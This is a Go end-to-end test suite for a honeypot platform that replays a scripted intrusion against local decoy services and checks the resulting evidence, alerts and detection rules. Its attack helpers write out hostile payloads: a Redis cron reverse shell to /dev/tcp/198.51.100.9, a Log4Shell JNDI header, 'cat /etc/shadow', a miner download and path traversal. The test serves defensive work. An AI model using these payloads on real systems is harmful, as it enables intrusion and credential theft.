// Package e2e exercises a complete MIRAGE deployment: the same wiring the
// binary uses, driven by a scripted intrusion, asserted on the evidence that
// comes out the other end.
package e2e

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/sauron666/Honeypot/internal/app"
	"github.com/sauron666/Honeypot/internal/config"
	"github.com/sauron666/Honeypot/internal/engagement"
	"github.com/sauron666/Honeypot/internal/event"
	"github.com/sauron666/Honeypot/internal/store"
)

// freePort asks the kernel for an unused port and gives it straight back. There
// is a race in principle; in practice it is the standard way to get a port for
// a test that needs a real listener.
func freePort(t *testing.T) int {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer l.Close()
	return l.Addr().(*net.TCPAddr).Port
}

type deployment struct {
	app   *app.App
	ports map[string]int
	api   string
	dir   string
}

func deploy(t *testing.T) *deployment {
	t.Helper()
	dir := t.TempDir()
	ports := map[string]int{
		"api": freePort(t), "ssh": freePort(t), "http": freePort(t),
		"redis": freePort(t), "telnet": freePort(t), "ftp": freePort(t),
	}

	yaml := fmt.Sprintf(`
tenant: e2e
site: lab
data_dir: %s
api:
  listen: 127.0.0.1:%d
honeyd:
  bind: 127.0.0.1
  decoys:
    - id: dcy-web01
      persona: linux/web
      services:
        - {service: ssh,    port: %d}
        - {service: http,   port: %d}
        - {service: telnet, port: %d}
        - {service: ftp,    port: %d}
    - id: dcy-db01
      persona: linux/db
      services:
        - {service: redis, port: %d}
engagement:
  idle_timeout: 30m
alerts:
  min_severity: high
  sinks:
    - driver: file
      config:
        path: alerts.jsonl
`, dir, ports["api"], ports["ssh"], ports["http"], ports["telnet"], ports["ftp"], ports["redis"])

	cfg, err := config.Parse([]byte(yaml))
	if err != nil {
		t.Fatalf("config: %v", err)
	}
	a, err := app.New(cfg, slog.New(slog.DiscardHandler))
	if err != nil {
		t.Fatalf("app.New: %v", err)
	}
	if err := a.Start(context.Background()); err != nil {
		t.Fatalf("start: %v", err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		a.Stop(ctx)
	})

	d := &deployment{app: a, ports: ports, api: fmt.Sprintf("http://127.0.0.1:%d", ports["api"]), dir: dir}
	d.waitReady(t)
	return d
}

func (d *deployment) waitReady(t *testing.T) {
	t.Helper()
	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		resp, err := http.Get(d.api + "/api/health")
		if err == nil {
			resp.Body.Close()
			if resp.StatusCode == 200 {
				return
			}
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatal("deployment did not become ready")
}

func (d *deployment) addr(service string) string {
	return fmt.Sprintf("127.0.0.1:%d", d.ports[service])
}

func (d *deployment) getJSON(t *testing.T, path string, into any) {
	t.Helper()
	resp, err := http.Get(d.api + path)
	if err != nil {
		t.Fatalf("GET %s: %v", path, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("GET %s: %s", path, resp.Status)
	}
	if err := json.NewDecoder(resp.Body).Decode(into); err != nil {
		t.Fatalf("decode %s: %v", path, err)
	}
}

// TestFullIntrusionProducesOneEngagement scripts an intrusion the way a real
// one arrives -- recon on the web decoy, a Redis takeover attempt, a telnet
// brute force, then a hands-on SSH session -- and asserts that MIRAGE turns it
// into a single, complete, tamper-evident story.
func TestFullIntrusionProducesOneEngagement(t *testing.T) {
	d := deploy(t)

	// 1. Reconnaissance against the web decoy.
	base := "http://" + d.addr("http")
	client := &http.Client{Timeout: 10 * time.Second}
	for _, path := range []string{"/", "/.env", "/.git/config", "/wp-login.php",
		"/index.php?file=../../../../etc/passwd"} {
		resp, err := client.Get(base + path)
		if err != nil {
			t.Fatalf("recon %s: %v", path, err)
		}
		resp.Body.Close()
	}
	// Exploit attempt in a header, which is where Log4Shell actually arrives.
	req, _ := http.NewRequest("GET", base+"/", nil)
	req.Header.Set("User-Agent", "${jndi:ldap://198.51.100.5:1389/x}")
	if resp, err := client.Do(req); err == nil {
		resp.Body.Close()
	}

	// 2. Redis takeover chain against the database decoy.
	redisAttack(t, d.addr("redis"))

	// 3. Telnet brute force, then a successful login and hands-on commands.
	telnetAttack(t, d.addr("telnet"))

	// 4. SSH session that reads the planted credentials.
	sshAttack(t, d.addr("ssh"))

	// --- assertions on the story -----------------------------------------
	var engResp struct {
		Engagements []engagement.Engagement `json:"engagements"`
	}
	waitUntil(t, 10*time.Second, "engagement to reach maximum risk", func() bool {
		d.getJSON(t, "/api/engagements", &engResp)
		return len(engResp.Engagements) == 1 && engResp.Engagements[0].RiskScore >= 90
	})

	eng := engResp.Engagements[0]
	if len(engResp.Engagements) != 1 {
		t.Fatalf("one attacker produced %d engagements; the stitching is broken", len(engResp.Engagements))
	}
	for _, svc := range []string{"http", "redis", "telnet", "ssh"} {
		if !contains(eng.Services, svc) {
			t.Errorf("engagement is missing the %s leg: %v", svc, eng.Services)
		}
	}
	if len(eng.Decoys) != 2 {
		t.Errorf("engagement should span both decoys, got %v", eng.Decoys)
	}
	if !eng.Authenticated {
		t.Error("engagement should be marked authenticated")
	}
	if len(eng.HoneytokensHit) == 0 {
		t.Error("the planted credentials were read but no honeytoken hit was recorded")
	}
	if len(eng.PayloadURLs) == 0 {
		t.Error("the attacker's payload URL was not captured")
	}
	// The techniques are what a report is built from; a handful of the obvious
	// ones must be present.
	for _, want := range []string{"T1110", "T1105", "T1003.008", "T1595.003"} {
		if !contains(eng.Techniques, want) {
			t.Errorf("engagement is missing technique %s: %v", want, eng.Techniques)
		}
	}

	// --- assertions on the evidence ---------------------------------------
	var evResp struct {
		Events []*event.Event `json:"events"`
	}
	d.getJSON(t, "/api/engagements/"+eng.ID+"/events?limit=1000", &evResp)
	if len(evResp.Events) < 25 {
		t.Fatalf("engagement timeline has only %d events", len(evResp.Events))
	}
	// The timeline must read forward in time: it is the incident narrative.
	for i := 1; i < len(evResp.Events); i++ {
		if evResp.Events[i].Time < evResp.Events[i-1].Time {
			t.Fatalf("engagement timeline is not in chronological order at index %d", i)
		}
	}

	// The chain must verify through the API and offline, over the same file.
	var verify struct {
		Verified bool   `json:"verified"`
		Events   uint64 `json:"events"`
		Error    string `json:"error"`
	}
	resp, err := http.Post(d.api+"/api/evidence/verify", "application/json", nil)
	if err != nil {
		t.Fatal(err)
	}
	json.NewDecoder(resp.Body).Decode(&verify)
	resp.Body.Close()
	if !verify.Verified {
		t.Fatalf("evidence chain does not verify: %s", verify.Error)
	}

	// --- the forge turns the engagement into detection content -------------
	forgeResp, err := http.Get(d.api + "/api/engagements/" + eng.ID + "/forge")
	if err != nil {
		t.Fatal(err)
	}
	var bundle struct {
		Rules []struct {
			Format, Title, Content string
		} `json:"rules"`
		IOCs []struct {
			Type, Value string
		} `json:"iocs"`
		Report string `json:"report"`
		STIX   string `json:"stix"`
	}
	json.NewDecoder(forgeResp.Body).Decode(&bundle)
	forgeResp.Body.Close()

	if len(bundle.Rules) < 3 {
		t.Fatalf("the forge produced %d rules from a full intrusion", len(bundle.Rules))
	}
	formats := map[string]bool{}
	for _, r := range bundle.Rules {
		formats[r.Format] = true
		if strings.TrimSpace(r.Content) == "" {
			t.Errorf("rule %q has no content", r.Title)
		}
	}
	for _, want := range []string{"sigma", "suricata"} {
		if !formats[want] {
			t.Errorf("no %s rules were generated", want)
		}
	}
	if !strings.Contains(bundle.Report, "# Incident report") {
		t.Error("no incident report was generated")
	}
	var stixBundle map[string]any
	if err := json.Unmarshal([]byte(bundle.STIX), &stixBundle); err != nil {
		t.Errorf("the STIX bundle is not valid JSON: %v", err)
	}
	var sawPayloadURL bool
	for _, i := range bundle.IOCs {
		if i.Type == "url" && strings.Contains(i.Value, "198.51.100.66") {
			sawPayloadURL = true
		}
	}
	if !sawPayloadURL {
		t.Error("the payload URL did not become an indicator")
	}

	// The same content must be available in the raw formats a SIEM ingests.
	for _, format := range []string{"sigma", "suricata", "report", "stix"} {
		resp, err := http.Get(d.api + "/api/engagements/" + eng.ID + "/forge?format=" + format)
		if err != nil {
			t.Fatal(err)
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if len(body) == 0 {
			t.Errorf("format %s returned nothing", format)
		}
	}

	// --- assertions on alerting -------------------------------------------
	alertPath := filepath.Join(d.dir, "alerts.jsonl")
	raw, err := os.ReadFile(alertPath)
	if err != nil {
		t.Fatalf("no alerts were written: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(raw)), "\n")
	if len(lines) < 3 {
		t.Fatalf("expected several alerts, got %d", len(lines))
	}
	var sawHoneytoken, sawAuth bool
	for _, l := range lines {
		var a map[string]any
		if err := json.Unmarshal([]byte(l), &a); err != nil {
			t.Fatalf("alert is not valid JSON: %v", err)
		}
		if a["url"] == "" {
			t.Error("alert has no link back to its engagement")
		}
		switch a["title"] {
		case "Honeytoken accessed":
			sawHoneytoken = true
		case "Attacker authenticated to a decoy", "Decoy login succeeded":
			sawAuth = true
		}
	}
	if !sawHoneytoken {
		t.Error("reading planted credentials did not produce an alert")
	}
	if !sawAuth {
		t.Error("an attacker authenticating did not produce an alert")
	}
}

// TestEvidenceSurvivesRestart proves the chain spans process lifetimes: a
// restart must not be a way to launder tampered evidence.
func TestEvidenceSurvivesRestart(t *testing.T) {
	dir := t.TempDir()
	yamlFor := func(apiPort, httpPort int) string {
		return fmt.Sprintf(`
tenant: e2e
site: lab
data_dir: %s
api: {listen: "127.0.0.1:%d"}
honeyd:
  bind: 127.0.0.1
  decoys:
    - id: dcy-web01
      persona: linux/web
      services: [{service: http, port: %d}]
alerts:
  min_severity: critical
  sinks: [{driver: stdout}]
`, dir, apiPort, httpPort)
	}

	run := func() uint64 {
		cfg, err := config.Parse([]byte(yamlFor(freePort(t), freePort(t))))
		if err != nil {
			t.Fatal(err)
		}
		a, err := app.New(cfg, slog.New(slog.DiscardHandler))
		if err != nil {
			t.Fatal(err)
		}
		if err := a.Start(context.Background()); err != nil {
			t.Fatal(err)
		}
		addr := a.Farm.Addrs()[0]
		for i := 0; i < 5; i++ {
			resp, err := http.Get("http://" + addr + "/.env")
			if err != nil {
				t.Fatal(err)
			}
			resp.Body.Close()
		}
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		st := a.Store.Stats()
		if err := a.Stop(ctx); err != nil {
			t.Fatal(err)
		}
		return st.Events
	}

	first := run()
	second := run()
	if second <= first {
		t.Fatalf("second run started a new chain (%d then %d): evidence would be lost", first, second)
	}

	st, err := store.OpenFile(filepath.Join(dir, "evidence.jsonl"),
		store.FileOptions{MemoryWindow: 10, SyncEvery: 0})
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	if err := st.Verify(context.Background()); err != nil {
		t.Fatalf("chain spanning two runs does not verify: %v", err)
	}
}

// TestManagementAPIRequiresItsToken checks the control plane is not readable by
// anyone who can reach the port.
func TestManagementAPIRequiresItsToken(t *testing.T) {
	dir := t.TempDir()
	apiPort := freePort(t)
	cfg, err := config.Parse([]byte(fmt.Sprintf(`
tenant: e2e
site: lab
data_dir: %s
api:
  listen: "127.0.0.1:%d"
  token: "s3cret-token"
honeyd:
  bind: 127.0.0.1
  decoys:
    - id: d
      persona: linux/web
      services: [{service: http, port: %d}]
`, dir, apiPort, freePort(t))))
	if err != nil {
		t.Fatal(err)
	}
	a, err := app.New(cfg, slog.New(slog.DiscardHandler))
	if err != nil {
		t.Fatal(err)
	}
	if err := a.Start(context.Background()); err != nil {
		t.Fatal(err)
	}
	defer func() {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		a.Stop(ctx)
	}()

	base := fmt.Sprintf("http://127.0.0.1:%d", apiPort)
	waitUntil(t, 10*time.Second, "api to start", func() bool {
		resp, err := http.Get(base + "/api/health")
		if err != nil {
			return false
		}
		resp.Body.Close()
		return true
	})

	resp, err := http.Get(base + "/api/events")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("evidence readable without a token: %s", resp.Status)
	}

	req, _ := http.NewRequest("GET", base+"/api/events", nil)
	req.Header.Set("Authorization", "Bearer s3cret-token")
	resp, err = http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("valid token rejected: %s", resp.Status)
	}
}

// --- attack helpers --------------------------------------------------------

func redisAttack(t *testing.T, addr string) {
	t.Helper()
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatalf("redis dial: %v", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(15 * time.Second))
	r := bufio.NewReader(conn)

	for _, cmd := range []string{
		"PING", "INFO",
		"CONFIG SET dir /var/spool/cron",
		"CONFIG SET dbfilename root",
		`SET pwn "* * * * * bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"`,
		"SAVE",
	} {
		fmt.Fprintf(conn, "%s\r\n", cmd)
		if _, err := r.ReadString('\n'); err != nil {
			t.Fatalf("redis %q: %v", cmd, err)
		}
	}
}

func telnetAttack(t *testing.T, addr string) {
	t.Helper()
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatalf("telnet dial: %v", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(40 * time.Second))
	r := bufio.NewReader(conn)

	expect(t, r, "login:")
	fmt.Fprint(conn, "root\r\n")
	expect(t, r, "Password:")
	fmt.Fprint(conn, "hunter2\r\n") // wrong on purpose
	expect(t, r, "Login incorrect")

	expect(t, r, "login:")
	fmt.Fprint(conn, "root\r\n")
	expect(t, r, "Password:")
	fmt.Fprint(conn, "toor\r\n") // one of the planted weak passwords
	expect(t, r, "root@")

	for _, cmd := range []string{"uname -a", "cat /etc/shadow", "wget http://198.51.100.66/miner.sh"} {
		fmt.Fprintf(conn, "%s\r\n", cmd)
		expect(t, r, "root@")
	}
	fmt.Fprint(conn, "exit\r\n")
}

func sshAttack(t *testing.T, addr string) {
	t.Helper()
	client, err := ssh.Dial("tcp", addr, &ssh.ClientConfig{
		User:            "deploy",
		Auth:            []ssh.AuthMethod{ssh.Password("Summer2024!")},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         15 * time.Second,
	})
	if err != nil {
		t.Fatalf("ssh dial: %v", err)
	}
	defer client.Close()

	sess, err := client.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	defer sess.Close()
	out, err := sess.Output("cat /var/www/html/.env")
	if err != nil {
		t.Fatalf("ssh exec: %v", err)
	}
	if !strings.Contains(string(out), "DB_PASSWORD=") {
		t.Fatalf("planted credentials not served over ssh: %q", out)
	}
}

func expect(t *testing.T, r *bufio.Reader, want string) {
	t.Helper()
	var sb strings.Builder
	buf := make([]byte, 1)
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		n, err := r.Read(buf)
		if n > 0 {
			sb.WriteByte(buf[0])
			if strings.Contains(sb.String(), want) {
				return
			}
		}
		if err != nil {
			t.Fatalf("waiting for %q: %v (got %q)", want, err, sb.String())
		}
	}
	t.Fatalf("timed out waiting for %q, got %q", want, sb.String())
}

func waitUntil(t *testing.T, d time.Duration, what string, pred func() bool) {
	t.Helper()
	deadline := time.Now().Add(d)
	for time.Now().Before(deadline) {
		if pred() {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for %s", what)
}

func contains(list []string, want string) bool {
	for _, s := range list {
		if s == want {
			return true
		}
	}
	return false
}

// TestHoneytokenFiresBothWays covers the two ways a token triggers: someone
// fetches its callback URL, and someone carries its value onto a decoy.
func TestHoneytokenFiresBothWays(t *testing.T) {
	dir := t.TempDir()
	ports := map[string]int{"api": freePort(t), "tokens": freePort(t), "telnet": freePort(t)}

	cfg, err := config.Parse([]byte(fmt.Sprintf(`
tenant: e2e
site: lab
data_dir: %s
api: {listen: "127.0.0.1:%d"}
tokens:
  base_url: "http://127.0.0.1:%d"
honeyd:
  bind: 127.0.0.1
  decoys:
    - id: dcy-web01
      persona: linux/web
      services:
        - {service: tokens, port: %d}
        - {service: telnet, port: %d}
alerts:
  min_severity: high
  sinks: [{driver: file, config: {path: alerts.jsonl}}]
`, dir, ports["api"], ports["tokens"], ports["tokens"], ports["telnet"])))
	if err != nil {
		t.Fatal(err)
	}
	a, err := app.New(cfg, slog.New(slog.DiscardHandler))
	if err != nil {
		t.Fatal(err)
	}
	if err := a.Start(context.Background()); err != nil {
		t.Fatal(err)
	}
	defer func() {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		a.Stop(ctx)
	}()

	base := fmt.Sprintf("http://127.0.0.1:%d", ports["api"])
	waitUntil(t, 10*time.Second, "api", func() bool {
		resp, err := http.Get(base + "/api/health")
		if err != nil {
			return false
		}
		resp.Body.Close()
		return true
	})

	// Mint two tokens through the API, as an operator would.
	mint := func(kind, label, location string) map[string]any {
		body, _ := json.Marshal(map[string]string{"type": kind, "label": label, "location": location})
		resp, err := http.Post(base+"/api/tokens", "application/json", strings.NewReader(string(body)))
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusCreated {
			t.Fatalf("mint %s: %s", kind, resp.Status)
		}
		var out map[string]any
		json.NewDecoder(resp.Body).Decode(&out)
		return out
	}
	urlToken := mint("url", "quarterly results link", "email signature")
	awsToken := mint("aws-key", "finance share key", `\\FS01\finance\backup.ps1`)

	// --- way one: the callback is fetched ---------------------------------
	resp, err := http.Get(urlToken["value"].(string))
	if err != nil {
		t.Fatalf("fetching the canary URL: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("canary URL returned %s; it must look unremarkable", resp.Status)
	}

	// --- way two: the value turns up on a decoy ---------------------------
	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", ports["telnet"]))
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(40 * time.Second))
	r := bufio.NewReader(conn)
	expect(t, r, "login:")
	fmt.Fprint(conn, "root\r\n")
	expect(t, r, "Password:")
	fmt.Fprint(conn, "toor\r\n")
	expect(t, r, "root@")
	// The attacker pastes the key they found on the file share.
	fmt.Fprintf(conn, "export AWS_ACCESS_KEY_ID=%s\r\n", awsToken["value"])
	expect(t, r, "root@")

	// --- assertions --------------------------------------------------------
	var tokenResp struct {
		Tokens []struct {
			ID       string `json:"id"`
			Type     string `json:"type"`
			Triggers int    `json:"triggers"`
		} `json:"tokens"`
		Triggered int `json:"triggered"`
	}
	waitUntil(t, 10*time.Second, "both tokens to fire", func() bool {
		d := deployment{api: base}
		d.getJSON(t, "/api/tokens", &tokenResp)
		return tokenResp.Triggered == 2
	})
	for _, tok := range tokenResp.Tokens {
		if tok.Triggers == 0 {
			t.Errorf("token %s (%s) did not fire", tok.ID, tok.Type)
		}
	}

	var evResp struct {
		Events []*event.Event `json:"events"`
	}
	d := deployment{api: base}
	d.getJSON(t, "/api/events?limit=500", &evResp)

	var callback, observed *event.Event
	for _, e := range evResp.Events {
		if e.ClassUID != event.ClassTokenTriggered {
			continue
		}
		switch e.GetString("trigger_method") {
		case "callback":
			callback = e
		case "observed":
			observed = e
		}
	}
	if callback == nil {
		t.Fatal("no callback trigger was recorded")
	}
	if observed == nil {
		t.Fatal("no observed trigger was recorded: a planted key carried onto a decoy must fire")
	}
	// The location is what turns an alert into an investigation.
	if observed.GetString("token_location") != `\\FS01\finance\backup.ps1` {
		t.Fatalf("observed trigger lost the plant location: %q", observed.GetString("token_location"))
	}
	if observed.SeverityID != event.SeverityCritical || callback.SeverityID != event.SeverityCritical {
		t.Error("token triggers must be critical: there is no benign explanation")
	}

	// The bait document must be generated on demand and be a real package.
	docResp, err := http.Get(base + "/api/tokens/" + urlToken["id"].(string) + "/docx")
	if err != nil {
		t.Fatal(err)
	}
	defer docResp.Body.Close()
	doc, _ := io.ReadAll(docResp.Body)
	if len(doc) < 512 || string(doc[:2]) != "PK" {
		t.Fatalf("the generated document is not a zip package (%d bytes)", len(doc))
	}
}

// TestSelfTestDetectsABrokenChain runs the assurance probe against a healthy
// deployment, then against one whose evidence store cannot answer, and checks
// that the difference is visible.
//
// A silent honeypot is worse than none: it produces the feeling of coverage
// while something quietly swallows everything. This is the check that notices.
func TestSelfTestDetectsABrokenChain(t *testing.T) {
	d := deploy(t)

	resp, err := http.Post(d.api+"/api/assure", "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()

	var rep struct {
		Results []struct {
			Scenario string `json:"scenario"`
			Service  string `json:"service"`
			Acted    bool   `json:"acted"`
			Recorded bool   `json:"recorded"`
			Skipped  bool   `json:"skipped"`
			Events   int    `json:"events"`
			Error    string `json:"error"`
		} `json:"results"`
		Passed  int    `json:"passed"`
		Failed  int    `json:"failed"`
		Healthy bool   `json:"healthy"`
		Summary string `json:"summary"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&rep); err != nil {
		t.Fatal(err)
	}

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("self-test on a healthy deployment returned %s: %s", resp.Status, rep.Summary)
	}
	if !rep.Healthy || rep.Failed != 0 {
		var detail []string
		for _, r := range rep.Results {
			if !r.Skipped && (!r.Acted || !r.Recorded) {
				detail = append(detail, r.Scenario+": "+r.Error)
			}
		}
		t.Fatalf("healthy deployment failed its own self-test: %s\n%s",
			rep.Summary, strings.Join(detail, "\n"))
	}
	if rep.Passed < 3 {
		t.Fatalf("only %d scenarios ran; the deployment has http, telnet, ftp and redis decoys", rep.Passed)
	}
	for _, r := range rep.Results {
		if r.Skipped {
			continue
		}
		if r.Events == 0 {
			t.Errorf("scenario %s passed but recorded no events", r.Scenario)
		}
	}

	// The synthetic traffic must be marked, or the next report will describe a
	// self-test as an intrusion.
	var evResp struct {
		Events []*event.Event `json:"events"`
	}
	d.getJSON(t, "/api/events?q=MIRAGE-ASSURE&limit=100", &evResp)
	if len(evResp.Events) == 0 {
		t.Fatal("the assurance probes left no identifiable trace")
	}
	for _, e := range evResp.Events {
		if !strings.Contains(fmt.Sprint(e.Data)+e.Message, "MIRAGE-ASSURE") {
			t.Errorf("event %s matched the probe marker but does not carry it", e.Metadata.UID)
		}
	}
}

// TestPlanAndApplyChangeTheFarmWithoutARestart exercises deception-as-code:
// review a manifest against what is running, then reconcile.
//
// A platform that needs a restart to change gets changed less often than it
// should, and a restart is visible to an attacker who is already engaged.
func TestPlanAndApplyChangeTheFarmWithoutARestart(t *testing.T) {
	dir := t.TempDir()
	apiPort := freePort(t)
	sshPort, httpPort, ldapPort := freePort(t), freePort(t), freePort(t)

	manifest := func(extra string) string {
		return fmt.Sprintf(`
tenant: e2e
site: lab
data_dir: %s
api: {listen: "127.0.0.1:%d"}
honeyd:
  bind: 127.0.0.1
  decoys:
    - id: dcy-web01
      persona: linux/web
      services:
        - {service: ssh,  port: %d}
        - {service: http, port: %d}
%s
alerts:
  min_severity: high
  sinks: [{driver: stdout}]
`, dir, apiPort, sshPort, httpPort, extra)
	}

	cfg, err := config.Parse([]byte(manifest("")))
	if err != nil {
		t.Fatal(err)
	}
	a, err := app.New(cfg, slog.New(slog.DiscardHandler))
	if err != nil {
		t.Fatal(err)
	}
	if err := a.Start(context.Background()); err != nil {
		t.Fatal(err)
	}
	defer func() {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		a.Stop(ctx)
	}()

	base := fmt.Sprintf("http://127.0.0.1:%d", apiPort)
	waitUntil(t, 10*time.Second, "api", func() bool {
		resp, err := http.Get(base + "/api/health")
		if err != nil {
			return false
		}
		resp.Body.Close()
		return true
	})

	post := func(path, body string) map[string]any {
		t.Helper()
		resp, err := http.Post(base+path, "application/yaml", strings.NewReader(body))
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		var out map[string]any
		if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
			t.Fatal(err)
		}
		return out
	}
	changes := func(resp map[string]any) []map[string]any {
		plan, _ := resp["plan"].(map[string]any)
		raw, _ := plan["changes"].([]any)
		var out []map[string]any
		for _, c := range raw {
			out = append(out, c.(map[string]any))
		}
		return out
	}

	// Planning the running manifest must be a no-op.
	if n := len(changes(post("/api/config/plan", manifest("")))); n != 0 {
		t.Fatalf("planning the running manifest produced %d changes", n)
	}

	// Now add a domain controller and drop the http decoy.
	added := fmt.Sprintf(`    - id: dcy-dc01
      persona: windows/dc
      services:
        - {service: ldap, port: %d}
`, ldapPort)
	withoutHTTP := strings.Replace(manifest(added),
		fmt.Sprintf("        - {service: http, port: %d}\n", httpPort), "", 1)

	plan := post("/api/config/plan", withoutHTTP)
	got := changes(plan)
	if len(got) != 2 {
		t.Fatalf("expected an add and a remove, got %d: %v", len(got), got)
	}
	// A plan must not change anything.
	if resp, err := http.Get("http://" + fmt.Sprintf("127.0.0.1:%d", httpPort) + "/"); err != nil {
		t.Fatal("planning took the http decoy down")
	} else {
		resp.Body.Close()
	}

	applied := post("/api/config/apply", withoutHTTP)
	if applied["applied"] != true {
		t.Fatalf("apply reported %v", applied["applied"])
	}

	// The new decoy answers.
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", ldapPort), 5*time.Second)
	if err != nil {
		t.Fatalf("the added ldap decoy does not answer: %v", err)
	}
	conn.Close()

	// The removed one does not.
	if c, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", httpPort), 2*time.Second); err == nil {
		c.Close()
		t.Fatal("the removed http decoy is still accepting connections")
	}

	// The untouched ssh decoy kept serving throughout.
	conn, err = net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", sshPort), 5*time.Second)
	if err != nil {
		t.Fatalf("the unchanged ssh decoy stopped answering: %v", err)
	}
	conn.Close()

	// Applying the same manifest again must be a no-op.
	if n := len(changes(post("/api/config/plan", withoutHTTP))); n != 0 {
		t.Fatalf("re-planning after apply produced %d changes", n)
	}

	// A change that cannot be applied in place must be reported, not silently
	// ignored.
	renamed := strings.Replace(withoutHTTP, "tenant: e2e", "tenant: somebody-else", 1)
	restartPlan := post("/api/config/plan", renamed)
	plan2, _ := restartPlan["plan"].(map[string]any)
	req, _ := plan2["requires_restart"].([]any)
	if len(req) == 0 {
		t.Fatal("changing the tenant must be reported as needing a restart")
	}
}
